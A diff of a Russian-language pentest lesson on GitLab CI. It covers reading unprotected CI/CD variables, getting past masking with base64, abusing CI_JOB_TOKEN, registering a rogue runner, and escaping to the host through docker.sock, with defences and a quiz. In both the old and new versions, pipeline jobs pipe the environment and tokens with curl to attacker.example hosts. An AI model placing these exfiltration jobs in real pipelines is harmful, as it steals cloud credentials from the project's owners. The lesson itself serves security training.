@@ -14,191 +14,232 @@ useful_for:
 estimated_minutes: 50
 summary: "GitLab CI: .gitlab-ci.yml, runners (shared/specific), protected/masked переменные, runner-token и CI_JOB_TOKEN. Как из job'а получить облачные креды и выйти на раннер."
 ---
+## Задача
 
-## Зачем этот урок
+Мы разобрали GitHub Actions. Теперь — **GitLab CI**, второй по популярности CI/CD. У него другая модель: сборки выполняют **runners** (раннеры) — отдельные агенты, которым GitLab отдаёт job. Задача: показать, как из job'а вытащить переменные, токены и облачные креды, и как выйти на сам раннер. Разберём на конкретном проекте.
 
-GitLab CI — распространённый self-hosted CI/CD в корпорациях. Пайплайн описывается `.gitlab-ci.yml`, исполняется на **runner'ах**, а секреты хранятся в **CI/CD variables** проекта/группы. Компрометация раннера или переменных даёт облачные креды (AWS/Azure/GCP), доступ к реестрам и возможность выполнять код на инфраструктуре сборки. GitLab интересен тем, что runner часто имеет доступ во внутреннюю сеть и к другим проектам группы.
+## Данные: .gitlab-ci.yml и переменные
 
-## Модель GitLab CI
-
-- **Pipeline → stages → jobs**; job исполняется на runner.
-- **Runner**: shared (общий), group, specific (привязан к проекту). Может быть shell, docker, kubernetes executor.
-- **Variables**: project/group/instance-level. Флаги: **protected** (только protected-ветки/теги), **masked** (скрытие в логах), **environment scope**.
-- **CI_JOB_TOKEN** — токен job'а для доступа к API/реестру; права ограничены.
-- **Runner token** — регистрационный токен; с ним можно зарегистрировать свой runner в проекте/группе.
-- **Artifacts / cache** — могут содержать секреты и использоваться для отравления.
-- **Includes** — `.gitlab-ci.yml` может включать файлы из других репозиториев/URL.
-
-## Инструменты и команды
-
-```bash
-# Через API с токеном (PAT/CI_JOB_TOKEN)
-curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects" | jq '.[].path_with_namespace'
-
-# Переменные проекта (значения скрыты, но видны имена/флаги)
-curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/variables" | jq '.[] | {key,masked,protected}'
-
-# Runner'ы
-curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/runners" | jq '.[] | {id,description,token}'
-
-# Pipelines и jobs
-curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/pipelines" | jq '.[].id'
-curl -s --header "PRIVATE-TOKEN: $TOKEN" "https://gitlab.example.com/api/v4/projects/1/pipelines/123/jobs" | jq '.[] | {name,status}'
-```
-
-## Разобранный пример: job из MR → переменные → облачные креды
-
-Сценарий: мы можем создавать ветки/MR и запускать пайплайны (например, через fork или с правом Developer).
+Конфиг пайплайна — файл `.gitlab-ci.yml` в корне репозитория. Смотрим его:
 
 ```yaml
-# .gitlab-ci.yml в нашей ветке
-stages: [exfil]
-exfil:
-  stage: exfil
+stages: [test, deploy]
+
+test:
+  stage: test
   script:
-    - env | sort | base64 -w0 | curl -X POST --data-binary @- http://attacker.example.com/leak
-    - cat "$AWS_WEB_IDENTITY_TOKEN_FILE" 2>/dev/null | curl -X POST --data-binary @- http://attacker.example.com/aws
-    - echo "$CI_JOB_TOKEN" | curl -X POST --data-binary @- http://attacker.example.com/jobtoken
+    - echo "running tests"
+    - env | sort
+
+deploy:
+  stage: deploy
+  script:
+    - aws s3 sync ./dist s3://acme-web/
 ```
 
-Если пайплайн запускается в контексте, где доступны protected-переменные (например, ветка не protected, но переменные не помечены protected — частая ошибка), вы получаете все секреты. В логах GitLab значения masked-переменных скрываются, поэтому выгружаем через base64/шифрование.
+Два job'а. `deploy` ходит в AWS — значит, у него есть облачные креды. `test` делает `env | sort` — печатает **всё окружение**. Переменные проекта смотрим через API:
 
-## Runner token и захват раннера
-
-Если утёк runner registration token, можно зарегистрировать свой runner в проекте/группе. Это даёт выполнение job'ов (включая те, что требуют specific runner) и доступ к сети, где живёт легитимный раннер.
-
-```bash
-gitlab-runner register \
-  --url https://gitlab.example.com/ \
-  --registration-token "$RUNNER_TOKEN" \
-  --executor shell \
-  --description attacker-runner
-# Теперь наши job'ы могут исполняться
+```
+$ curl -s --header "PRIVATE-TOKEN: $GL_TOKEN" \
+    "https://gitlab.acme.io/api/v4/projects/42/variables" | jq -r '.[] | "\(.key) protected=\(.protected) masked=\(.masked)"'
+AWS_ACCESS_KEY_ID protected=false masked=false
+AWS_SECRET_ACCESS_KEY protected=false masked=false
+DEPLOY_TOKEN protected=true masked=true
 ```
 
-Если раннер использует **shell executor** и запускает job'ы под сервисным аккаунтом, вы можете читать файлы, токены других job'ов, кеши и т.п. Docker executor даёт контейнер, но с доступом к Docker socket (в некоторых конфигурациях) — потенциальный побег.
+Ключевое: `AWS_ACCESS_KEY_ID` — `protected=false`. **Protected** значит «доступна только на защищённых ветках/тегах». Раз флаг снят, переменная доступна на **любой** ветке — и мы можем её прочитать.
 
-## Чек-лист атаки
+## Пробуем в лоб: почему переменные вообще видны
 
-1. Найти токены (PAT, runner token, CI_JOB_TOKEN) в репозиториях/логах.
-2. Перечислить проекты/группы и переменные.
-3. Проверить флаги protected/masked у переменных.
-4. Проверить, можно ли запускать пайплайны (роль Developer/Maintainer).
-5. Проверить `.gitlab-ci.yml` на include из внешних источников.
-6. Проверить runner'ы и их executor.
-7. Проверить artifacts/cache на секреты.
+Переменные CI/CD передаются job'у как окружение процесса. Любой скрипт в job'е может их прочитать: `env`, `printenv`, `echo $AWS_SECRET_ACCESS_KEY`. **Masked**-флаг скрывает значение в логах, но только если оно совпадает точно; `base64` или разбиение на части маскирование обходят.
 
-## Обход защит и edge cases
-
-- **Protected variables.** Доступны только на protected-ветках/тегах; обход — если у вас есть право push в protected-ветку или создать protected-тег.
-- **Masked variables.** Скрываются в логах; обход — base64/шифрование.
-- **Environment scope.** Переменные привязаны к environment; проверяйте, какой environment у job'а.
-- **CI_JOB_TOKEN.** Ограничен по правам; иногда позволяет читать реестр/другие проекты (если разрешено).
-- **Include.** `include: remote` может подтянуть `.gitlab-ci.yml` с внешнего URL — потенциальный контроль над пайплайном.
-- **Fork pipelines.** В некоторых конфигурациях MR из fork запускает пайплайн с секретами базового проекта.
-
-## Частые ошибки и подводные камни
-
-- Считать, что «переменные masked» = безопасно: они всё равно в окружении.
-- Не проверить флаги protected: часто переменные НЕ protected.
-- Игнорировать runner token как билет.
-- Забыть про artifacts/cache.
-- Не проверить include из внешних источников.
-
-## Защита и детект
-
-- Помечать секреты protected и ограничивать доступ к protected-веткам.
-- Использовать OIDC-федерацию вместо долгоживущих кредов в переменных.
-- Ограничить runner token; использовать specific runner'ы.
-- Аудит: GitLab audit events, алертить на регистрацию runner'ов и изменение переменных.
-- Ограничить include из внешних источников.
-
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — секреты в переменных без protected. Второй — утёкший runner token. Третий — shell executor с широкими правами. Четвёртый — include из внешнего URL. Пятый — fork pipelines с секретами. Все ведут к краже облачных кредов.
-
-## Практическое задание
-
-1. Создайте проект и переменную; проверьте поведение с флагом protected.
-2. Запустите job, выгружающий переменные через base64.
-3. Зарегистрируйте runner по токену и запустите job.
-4. Настройте OIDC-федерацию и уберите долгоживущие креды.
-
-## Что дальше / решение
-
-Из GitLab CI получаем облачные креды и доступ к сети. Дальше — использовать их. Зафиксируйте путь «job → переменные → облако» в графе. Если переменные protected и доступа к protected-ветке нет — ищите runner token или другие проекты.
-
-## Разобранный пример 2: include из внешнего URL
-
-`.gitlab-ci.yml` может включать конфигурацию из других репозиториев или URL (`include: remote`). Если include указывает на подконтрольный вам URL или репозиторий, вы контролируете пайплайн.
+Запускаем job на своей ветке и забираем окружение:
 
 ```yaml
-# .gitlab-ci.yml жертвы
-include:
-  - remote: 'https://config.example.com/ci/common.yml'
-  - project: 'shared/ci-templates'
-    file: '/templates/build.yml'
+steal:
+  script:
+    - env | base64 -w0 | curl -s -d @- https://attacker.example/x
 ```
 
-Если вы можете изменить `common.yml` (или репозиторий `shared/ci-templates`), ваши job'ы выполнятся в контексте целевого проекта — с его переменными. Также проверяйте `include: local` с путями, которые можно переопределить. Ещё один путь — перезапись `.gitlab-ci.yml` через MR, если у вас есть право merge (или если защита ветки слабая). Часто CI-конфиг менее защищён, чем код приложения, и именно он определяет, что исполняется.
+GitLab выполняет job на раннере, наш скрипт отправляет всё окружение наружу.
 
-## Artifacts, cache и environment
+## Приём: CI_JOB_TOKEN и что он открывает
 
-Artifacts и cache — каналы передачи данных между job'ами и источник утечек.
+Каждому job'у GitLab выдаёт **`CI_JOB_TOKEN`** — токен для обращения к API GitLab от имени job'а. Им можно:
+
+- читать API проектов, к которым разрешён доступ;
+- тянуть пакеты/образы из registry;
+- в некоторых конфигурациях — пушить в репозиторий.
+
+```
+$ curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" \
+    "https://gitlab.acme.io/api/v4/projects/42/repository/files/.env/raw?ref=main"
+DB_PASSWORD=...
+```
+
+Если job-token имеет широкий доступ — это путь к другим секретам.
+
+## Полный прогон: от переменных до облака
+
+1. **Разведка.** Список проектов и переменных через API (с нашим токеном).
+2. **Проверка флагов.** Ищем `protected=false` у облачных переменных.
+3. **Запуск job.** На своей ветке исполняем `env` и эксфильтруем окружение.
+4. **Добыча кредов.** `AWS_ACCESS_KEY_ID`/`SECRET` уходят к нам.
+5. **Проверка.**
+
+```
+$ AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
+{ "Arn": "arn:aws:iam::123456789012:user/gitlab-deploy" }
+```
+
+6. **Эскалация.** Смотрим права роли — часто `deploy` умеет писать в прод-бакеты и менять инфраструктуру.
+
+## Runners и выход на хост
+
+Раннер — это хост (или контейнер), где исполняется job. Различают:
+
+- **Shared runner** — общий для многих проектов; изоляция слабее.
+- **Specific runner** — привязан к проекту; часто «жирный» хост с доступом к сети.
+- **Docker executor** — job в контейнере; если смонтирован `docker.sock` или раннер `privileged`, из job'а легко выйти на хост (см. `cloud-docker-socket`).
+
+Проверить, что доступно из job'а:
+
+```
+$ ls -la /var/run/docker.sock
+srw-rw---- 1 root docker 0 ... /var/run/docker.sock
+$ docker -H unix:///var/run/docker.sock ps
+```
+
+Если сокет доступен — мы можем запускать контейнеры от root на хосте.
+
+## Частые ошибки
+
+- **Облачные переменные без protected.** Самая частая: `AWS_*` доступны на любой ветке.
+- **`echo` секретов в логах.** `set -x` или `env` в скрипте печатает значения (masked спасает не всегда).
+- **Shared-раннер с `docker.sock`.** Один проект компрометирует хост, общий для многих.
+- **Широкий `CI_JOB_TOKEN`.** Доступ к API чужих проектов.
+- **Отсутствие OIDC.** Статические ключи живут в переменных годами.
+
+## Защита и что ломает атаку
+
+- **Protected-переменные** + защищённые ветки: облачные креды доступны только с `main`.
+- **Masked-переменные** — не заменяют protected, но скрывают значения в логах.
+- **OIDC** вместо статических ключей (см. `cloud-oidc-federation`).
+- **Эфемерные изолированные раннеры** без `docker.sock`.
+- **Ограничение прав `CI_JOB_TOKEN`** и запрет на незащищённые ветки.
+
+## Если не сработало
+
+- **Все переменные protected** — на незащищённой ветке их не будет.
+- **Нет права пушить ветку** — job не запустить.
+- **`CI_JOB_TOKEN` узкий** — API других проектов закрыт.
+- **Эфемерный раннер без сокета** — выхода на хост нет.
+
+## Мини-сценарий: job на своей ветке
+
+1. **Разведка.** `GET /api/v4/projects/42/variables` → `AWS_ACCESS_KEY_ID protected=false`.
+2. **Проверка.** Флаг `protected=false` — переменная доступна на любой ветке.
+3. **Ветка.** Создаём ветку `feature/test` и добавляем job:
+
+```yaml
+steal:
+  script:
+    - env | base64 -w0 | curl -s -d @- https://attacker.example/x
+```
+
+4. **Запуск.** GitLab ставит job на раннер; скрипт исполняется в окружении job'а.
+5. **Сбор.** Окружение (включая `AWS_SECRET_ACCESS_KEY`) уходит к нам.
+6. **Проверка.** `aws sts get-caller-identity` → `user/gitlab-deploy`.
+7. **Эскалация.** Смотрим права роли — часто это доступ к прод-бакетам и инфраструктуре.
+
+Одна переменная без флага `protected` превращает любой пуш в кражу облачных кредов.
+
+## Разбор: почему флаг protected решает всё
+
+Разница между `protected=true` и `protected=false` — это разница между «креды недоступны» и «креды у любого, кто может запушить ветку». Protected привязывает переменную к защищённым ветками/тегам: на незащищённой ветке её в окружении просто нет. Поэтому атакующему важно, есть ли у него право пушить ветку и снят ли флаг. Masked не спасает — он лишь прячет значение в логах, а `base64`/разбиение его обходят. Урок: при аудите CI/CD первым делом смотрите не на код job'ов, а на **флаги переменных** и **защищённые ветки**. Один незакрытый флаг обесценивает всю изоляцию пайплайна.
+
+И проверяйте, кто вообще может пушить в защищённые ветки: если `main` открыт для всех, protected-переменные защищают лишь формально.
+
+## Что мы теперь знаем
+
+1. Переменные CI — окружение процесса job'а, читаемое любым скриптом.
+2. `protected=false` на облачных переменных — прямой путь к краже.
+3. `CI_JOB_TOKEN` даёт API-доступ от имени job'а.
+4. Masked не защищает от кодирования (`base64`).
+5. Раннеры с `docker.sock` дают выход на хост.
+
+## На что смотреть дальше
+
+- `/api/v4/projects/:id/variables` — ключи и флаги protected/masked.
+- `.gitlab-ci.yml` — что печатается в логах и что тянет креды.
+- Наличие `id_tokens:`/OIDC-конфигурации.
+- Тип раннера и наличие `docker.sock`.
+- Права `CI_JOB_TOKEN`.
+
+## Быстрая проверка
 
 ```bash
-# Скачиваем артефакты job'а
-curl -s --header "PRIVATE-TOKEN: $TOKEN" \
-  "https://gitlab.example.com/api/v4/projects/1/jobs/123/artifacts" -o artifacts.zip
-unzip -o artifacts.zip -d art && grep -rIE 'AKIA|password|token' art | head
-
-# Проверяем environment scope переменных
-curl -s --header "PRIVATE-TOKEN: $TOKEN" \
-  "https://gitlab.example.com/api/v4/projects/1/variables" | jq '.[] | {key,environment_scope}'
+curl -s --header "PRIVATE-TOKEN: $GL_TOKEN" \
+  "https://gitlab.acme.io/api/v4/projects/42/variables" | jq -r '.[] | "\(.key) \(.protected)"'
+grep -rn 'env\|printenv' .gitlab-ci.yml
+grep -rn 'id_tokens\|docker.sock' .gitlab-ci.yml
 ```
-
-Если переменная имеет `environment_scope: production`, её получит только job в этом environment — проверяйте, какой environment у вашего job'а и можно ли его подделать. Cache может содержать зависимости с секретами (например, `.npmrc` с токеном). Артефакты часто содержат собранные `.env` и конфиги. Отдельно проверяйте protected environments: если у вас есть право деплоить в protected environment, вы получите его секреты.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Чем protected-переменная отличается от обычной?"
+- question: "Что означает protected=false у переменной GitLab CI?"
   options:
-    - "Доступна только на protected-ветках/тегах"
-    - "Она зашифрована"
-    - "Она одноразовая"
-    - "Она публична"
+    - "Переменная доступна на любой ветке, а не только на защищённых"
+    - "Переменная зашифрована"
+    - "Переменная удалена"
+    - "Переменная видна только админам"
   answer: 0
-  explanation: "Protected variables доступны только в защищённом контексте."
-- question: "Зачем атакующему runner registration token?"
+  explanation: "protected ограничивает переменную защищёнными ref."
+- question: "Почему masked-переменную всё равно можно украсть?"
   options:
-    - "Зарегистрировать свой runner и выполнять job'ы"
-    - "Только читать логи"
-    - "Шифровать репозиторий"
-    - "Менять DNS"
+    - "Маскирование не срабатывает, если значение закодировать (например, base64)"
+    - "Маскирование всегда ломается"
+    - "Маскирование шифрует значение"
+    - "Маскирование удаляет переменную"
   answer: 0
-  explanation: "С токеном можно подключить подконтрольный runner к проекту/группе."
-- question: "Как обойти маскирование переменных в логах GitLab?"
+  explanation: "Маскируется точное совпадение; кодирование его обходит."
+- question: "Что такое CI_JOB_TOKEN?"
   options:
-    - "Закодировать значение (base64) перед выводом"
-    - "Секреты не маскируются"
-    - "Использовать SSH"
-    - "Отключить KMS"
+    - "Токен, выданный job'у для обращения к API GitLab"
+    - "Пароль администратора"
+    - "SSH-ключ раннера"
+    - "Токен AWS"
   answer: 0
-  explanation: "Маскирование ищет точное значение; кодирование обходит."
-- question: "Чем опасен shell executor?"
+  explanation: "Каждый job получает CI_JOB_TOKEN."
+- question: "Чем опасен docker.sock внутри раннера?"
   options:
-    - "Job исполняется прямо на хосте под сервисным аккаунтом"
-    - "Он медленнее"
-    - "Он не имеет прав"
-    - "Он шифрует"
+    - "Из job'а можно управлять Docker и выйти на хост"
+    - "Он замедляет сборку"
+    - "Он шифрует образы"
+    - "Он удаляет контейнеры"
   answer: 0
-  explanation: "Shell executor не изолирует контейнером."
+  explanation: "Доступ к сокету = контроль над хостом."
+- question: "Какая защита делает облачные креды недоступными с чужой ветки?"
+  options:
+    - "Protected-переменные + защищённые ветки"
+    - "Masked-переменные"
+    - "Отключение логов"
+    - "Смена раннера"
+  answer: 0
+  explanation: "Protected привязывает переменную к защищённым ref."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-argocd`) мы посмотрим на GitOps-контроллер, который держит креды к репозиториям и кластерам — ещё одно хранилище доверия. А пока главное: переменные CI — это обычное окружение процесса, и любая незащищённая облачная переменная — добыча.
 
 ## Где пригодится
 
-- **Red team:** кража облачных кредов из CI.
-- **Пентест инфраструктуры:** захват GitLab/runner.
-- **Blue team:** настройка protected variables и OIDC.
-- **Supply chain:** компрометация пайплайнов.
+- **Bug bounty:** публичные GitLab-проекты и их переменные.
+- **Red team:** от CI-job к облачным кредам.
+- **Пентест:** аудит GitLab CI и раннеров.
+- **Работа/DevSecOps:** protected/masked, OIDC, изоляция раннеров.
+- **Дальше по дереву:** `cloud-cicd-jenkins`, `cloud-oidc-federation`.
